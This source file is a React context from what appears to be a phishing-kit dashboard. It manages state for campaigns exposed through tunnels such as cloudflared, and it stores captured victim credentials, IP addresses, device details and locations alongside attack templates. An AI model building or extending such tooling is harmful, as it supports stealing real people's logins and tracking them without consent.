// contexts/PhishingContext.js
'use client';
import { createContext, useContext, useState, useEffect } from 'react';

const PhishingContext = createContext();

export const PhishingProvider = ({ children }) => {
    const [isActive, setIsActive] = useState(false);
    const [urls, setUrls] = useState([]); // Array of { tunneler, url }
    const [captures, setCaptures] = useState({ // Initialize with structure
        credentials: [],
        ips: [],
        deviceInfo: [],
        locations: [],
        // mediaFiles: [] // Add if needed later
    });
    const [options, setOptions] = useState({
        attackType: 'login',
        tunneler: 'cloudflared',
        port: 8080,
        template: '1', // Default template index for 'login'
        festival: '', // For Image type
        ytId: '',     // For Image/Video types
        region: 'eu', // Default for loclx
        subdomain: '',// For loclx pro
        redirectUrl: '',
        duration: 5000 // Default media duration
    });
     // Add state for storing fetched templates
    const [templates, setTemplates] = useState({});
    const [templatesLoading, setTemplatesLoading] = useState(true);
    const [templatesError, setTemplatesError] = useState('');


     // Fetch Templates on Mount or Rehydrate
    useEffect(() => {
        const fetchTemplates = async () => {
            setTemplatesLoading(true);
            setTemplatesError('');
             try {
                 const res = await fetch('/api/phishing', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ action: 'get_templates' })
                 });
                 const data = await res.json();
                 if (data.success) {
                     setTemplates(data.templates || {});
                     // Set initial template if default attackType's templates are loaded
                     const defaultTypeKey = Object.keys(data.templates).find(k => k.toLowerCase() === options.attackType.toLowerCase());
                     if (defaultTypeKey && data.templates[defaultTypeKey]?.length > 0 && !options.template) {
                         setOptions(o => ({ ...o, template: '1' })); // Default to first template index '1'
                     }
                 } else {
                     setTemplatesError(data.error || 'Failed to load templates.');
                 }
             } catch (err) {
                 setTemplatesError(`Network error loading templates: ${err.message}`);
             } finally {
                 setTemplatesLoading(false);
             }
        };
        fetchTemplates();
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []); // Fetch only once on mount


    // Update default template when attack type changes
    useEffect(() => {
        const typeKey = Object.keys(templates).find(k => k.toLowerCase() === options.attackType.toLowerCase());
        if (typeKey && templates[typeKey]?.length > 0) {
            // Reset to template '1' only if the current template value is invalid for the new type
            // This check is complex, simpler to just reset to '1' on type change
            // setOptions(o => ({ ...o, template: '1' }));
        } else {
             // If no templates for this type, clear selection
            // setOptions(o => ({ ...o, template: '' }));
        }
     // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [options.attackType, templates]);


    return (
        <PhishingContext.Provider value={{
            isActive, setIsActive,
            urls, setUrls,
            captures, setCaptures,
            options, setOptions,
             // Provide templates data and loading state
            templates,
            templatesLoading,
            templatesError
        }}>
            {children}
        </PhishingContext.Provider>
    );
};

export const usePhishing = () => useContext(PhishingContext);